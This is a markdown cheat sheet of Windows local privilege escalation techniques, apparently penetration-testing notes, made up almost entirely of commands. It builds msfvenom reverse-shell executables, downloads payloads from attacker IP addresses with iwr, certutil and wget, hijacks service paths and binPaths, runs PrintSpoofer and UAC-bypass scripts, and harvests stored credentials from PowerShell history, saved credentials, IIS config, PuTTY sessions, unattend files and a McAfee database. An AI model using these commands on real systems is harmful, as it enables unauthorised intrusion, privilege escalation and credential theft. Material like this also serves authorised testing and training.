# Local Privilege Escalation Windows
## Enumeration
-> Enumerates all local accounts
```
net user
```

-> Get information from a specific user
```
net user <user>
```

-> Check user privileges
```
whoami /priv
```

-> View groups you belong to
```
whoami /groups
```

-> View interfaces and network information  
```
ipconfig /all
```

-> View all active TCP connections and the TCP and UDP ports the host is listening on
```
netstat -ant
```

-> List running processes
```
tasklist
```

-> View system tasks
```
schtasks
```

---

## Unquoted Service Path
-> Detection 
```
wmic service get Name,State,PathName | findstr "Program"  
sc qc <service_name>  
\\ BINARY_PATH_NAME display Unquoted Service Paths, without ""
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
```

-> Exploitation - attacker
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > name <name_inside_the_path>.exe  
nc -nvlp <port>
```

-> Exploitation - windows
```
iwr -uri <ip>/<service_eecutable_name> -Outfile  <service_eecutable_name>
move <name_inside_the_path>.exe <service_path>  
```
```
sc stop <service_name>
sc start <service_name>
```
or  
```
shutdown /r
```

## binPath - Services
-> Detection
```
. .\PowerUp.ps1
Get-ModifiableService -Verbose
```
or
```
Get-ModifiableService -Verbose
wmic service get Name,State,PathName | findstr "Running" | findstr "Program"  
wmic service get Name,State,PathName | findstr "Program"  
icacls <pathname>  
//(F) and (i) (F)
accesschk.exe -wuvc <service_name>
//RW Everyone  
//  SERVICE_CHANGE_CONFIG
sc qc <service_name>
```

-> Exploitation - windows
```
certutil -urlcache -f http://10.9.1.137:803/ok.exe ok.exe  
sc config <name_ service> binPath="C:\Users\files\ok.exe" obj= LocalSystem  
sc stop <service_name>  
sc query <service_name>  
sc start <service_name>  
```

https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite  


### SeImpersonatePrivilege
```
PrintSpoofer64.exe -i -c cmd
```
https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

## Bypass UAC
### EventViewer
-> Step 1 - Kali
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -f exe > ok.exe
```
-> Step 2 - Win Owned  
```
cd C:\Windows\tasks
iwr -uri 192.168.119.139:805/shell.exe -Outfile shell.exe
Start-Process -NoNewWindow -FilePath C:\Windows\Tasks\shell.exe
```
-> Step 3 - Win Owned  
```
iwr -uri 192.168.119.139:805/powerup.ps1 -Outfile powerup.ps1
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```
`[+] Run a BypassUAC attack to elevate privileges to admin.`

-> Step 4 -Kali
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.139 LPORT=8445 -f exe > ok.exe
```
-> Step 5 - Win Owned
```
wget 192.168.119.139:805/Invoke-EventViewer.ps1 -O Invoke-EventViewer.ps1
. .\Invoke-EventViewer.ps1
Invoke-EventViewer cmd.exe /c "C:\Windows\tasks\shell2.exe"
Invoke-EventViewer C:\Windows\tasks\shell2.exe
```
https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1

### FodhelperBypass
https://raw.githubusercontent.com/winscripting/UAC-bypass/master/FodhelperBypass.ps1

### Capturing configuration file credentials
-> Powershell History  
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

-> EXploiting Saved Windows Credentials
```
cmdkey /list  
runas /savecred /user:admin cmd.exe
```

-> IIS Configuration  
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString  
type C:\inetpub\wwwroot\web.config | findstr connectionString
```
  
-> Retrieve Credentials from Software: PuTTY  
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

-> Unattended Windows Installations
```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
  
-> Identify  
```
dir /s *.db
```
-> McAfee Enterprise Endpoint Security - Credentials used during installation  

```
C:\ProgramData\McAfee\Agent\DB\ma.db
sqlitebrowser ma.db
python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
```
https://raw.githubusercontent.com/funoverip/mcafee-sitelist-pwd-decryption/master/mcafee_sitelist_pwd_decrypt.py

## Windows Enumeration Tools
-> PowerUp.ps1  
```
. .\PowerUp.ps1
Invoke-AllChecks
```
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1  

-> winPEASany.exe
```
winPEASany.exe
```
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS  

-> windows-privesc-check2.exe  
```
windows-privesc-check2.exe --dump -G
```
https://github.com/pentestmonkey/windows-privesc-check
